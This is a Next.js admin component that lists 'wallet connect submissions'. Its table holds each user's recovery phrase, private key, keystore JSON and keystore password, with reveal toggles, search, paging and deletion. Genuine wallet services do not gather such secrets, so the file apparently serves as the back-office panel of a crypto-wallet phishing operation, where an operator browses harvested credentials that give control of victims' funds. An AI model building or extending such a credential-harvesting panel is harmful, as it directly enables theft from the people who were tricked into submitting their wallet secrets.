"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { Search, ChevronLeft, ChevronRight, Trash2, Eye, EyeOff } from "lucide-react";
import Link from "next/link";
import { formatDateTime } from "@/lib/utils";

interface WalletConnect {
  id: string;
  name: string | null;
  vendor: string;
  phrase: string | null;
  keystoreJson: string | null;
  keystorePassword: string | null;
  privateKey: string | null;
  createdAt: string;
  user: { id: string; firstName: string; lastName: string; email: string } | null;
}

interface Props {
  records: WalletConnect[];
  total: number;
  page: number;
  pages: number;
  search: string;
}

function MaskedCell({ value }: { value: string | null }) {
  const [show, setShow] = useState(false);
  if (!value) return <span className="text-slate-300">—</span>;
  return (
    <div className="flex items-start gap-1.5 max-w-[200px]">
      <span className={`text-xs break-all ${show ? "text-slate-700" : "text-slate-400 select-none"}`}>
        {show ? value : "••••••••••••"}
      </span>
      <button onClick={() => setShow((v) => !v)} className="shrink-0 text-slate-400 hover:text-slate-700 transition-colors mt-0.5">
        {show ? <EyeOff className="h-3.5 w-3.5" /> : <Eye className="h-3.5 w-3.5" />}
      </button>
    </div>
  );
}

export function AdminWalletConnectsClient({ records, total, page, pages, search: initSearch }: Props) {
  const router = useRouter();
  const [search, setSearch] = useState(initSearch);
  const [deleting, setDeleting] = useState<string | null>(null);

  function buildQuery(overrides: Record<string, string>) {
    const params = new URLSearchParams();
    const vals: Record<string, string> = { search, ...overrides };
    Object.entries(vals).forEach(([k, v]) => { if (v) params.set(k, v); });
    return `/admin/wallet-connects?${params.toString()}`;
  }

  async function deleteRecord(id: string) {
    setDeleting(id);
    await fetch(`/api/admin/wallet-connects/${id}`, { method: "DELETE" });
    setDeleting(null);
    router.refresh();
  }

  return (
    <main className="flex-1 p-6 space-y-5">
      {/* Toolbar */}
      <div className="flex flex-wrap items-center gap-3">
        <div className="relative flex-1 min-w-48 max-w-sm">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-slate-400 pointer-events-none" />
          <input
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            onKeyDown={(e) => e.key === "Enter" && router.push(buildQuery({ search, page: "1" }))}
            placeholder="Search vendor, user..."
            className="w-full h-9 pl-9 pr-4 text-sm bg-white border border-slate-200 rounded-lg focus:outline-none focus:border-slate-400"
          />
        </div>
        <p className="text-sm text-slate-500">{total} total submission{total !== 1 ? "s" : ""}</p>
      </div>

      {/* Table */}
      <div className="bg-white rounded-2xl border border-slate-200 overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full text-sm">
            <thead>
              <tr className="border-b border-slate-100">
                {["Vendor", "User", "Recovery Phrase", "Private Key", "Keystore JSON", "Password", "Date", ""].map((h) => (
                  <th key={h} className="text-left px-5 py-3.5 text-xs font-semibold text-slate-500 uppercase tracking-wide">{h}</th>
                ))}
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-50">
              {records.map((r) => (
                <tr key={r.id} className="hover:bg-slate-50 transition-colors align-top">
                  <td className="px-5 py-3.5">
                    <div className="flex items-center gap-2">
                      <img
                        src={`/wallets/${r.vendor.toLowerCase().replace(/\s+/g, "")}.png`}
                        alt={r.vendor}
                        className="h-6 w-6 rounded-md object-cover shrink-0"
                        onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }}
                      />
                      <span className="font-medium text-slate-800 capitalize">{r.vendor}</span>
                    </div>
                  </td>
                  <td className="px-5 py-3.5">
                    {r.user ? (
                      <>
                        <Link href={`/admin/users/${r.user.id}`} className="font-medium text-slate-800 hover:text-slate-900 transition-colors">
                          {r.user.firstName} {r.user.lastName}
                        </Link>
                        <p className="text-xs text-slate-400">{r.user.email}</p>
                      </>
                    ) : r.name ? (
                      <span className="text-sm text-slate-700">{r.name}</span>
                    ) : null}
                  </td>
                  <td className="px-5 py-3.5"><MaskedCell value={r.phrase} /></td>
                  <td className="px-5 py-3.5"><MaskedCell value={r.privateKey} /></td>
                  <td className="px-5 py-3.5"><MaskedCell value={r.keystoreJson} /></td>
                  <td className="px-5 py-3.5"><MaskedCell value={r.keystorePassword} /></td>
                  <td className="px-5 py-3.5 text-slate-500 text-xs whitespace-nowrap">{formatDateTime(r.createdAt)}</td>
                  <td className="px-5 py-3.5">
                    <button
                      onClick={() => deleteRecord(r.id)}
                      disabled={deleting === r.id}
                      className="h-7 w-7 rounded-lg bg-red-50 text-red-500 hover:bg-red-100 flex items-center justify-center transition-colors disabled:opacity-60"
                      title="Delete"
                    >
                      <Trash2 className="h-3.5 w-3.5" />
                    </button>
                  </td>
                </tr>
              ))}
              {records.length === 0 && (
                <tr><td colSpan={8} className="text-center py-12 text-slate-400">No wallet connect submissions found</td></tr>
              )}
            </tbody>
          </table>
        </div>

        {pages > 1 && (
          <div className="flex items-center justify-between px-5 py-3.5 border-t border-slate-100 flex-wrap gap-2">
            <p className="text-xs text-slate-500">Page {page} of {pages} ({total} total)</p>
            <div className="flex items-center gap-1 flex-wrap">
              {page > 1 && (
                <Link href={buildQuery({ page: String(page - 1) })} className="h-8 w-8 rounded-lg border border-slate-200 bg-white flex items-center justify-center hover:bg-slate-50">
                  <ChevronLeft className="h-4 w-4 text-slate-600" />
                </Link>
              )}
              {Array.from({ length: pages }, (_, i) => i + 1).map((p) => (
                <Link key={p} href={buildQuery({ page: String(p) })}
                  className={`h-8 min-w-8 px-2 rounded-lg border text-xs font-medium flex items-center justify-center transition-colors ${p === page ? "bg-black text-white border-black" : "border-slate-200 bg-white hover:bg-slate-50 text-slate-600"}`}>
                  {p}
                </Link>
              ))}
              {page < pages && (
                <Link href={buildQuery({ page: String(page + 1) })} className="h-8 w-8 rounded-lg border border-slate-200 bg-white flex items-center justify-center hover:bg-slate-50">
                  <ChevronRight className="h-4 w-4 text-slate-600" />
                </Link>
              )}
            </div>
          </div>
        )}
      </div>
    </main>
  );
}
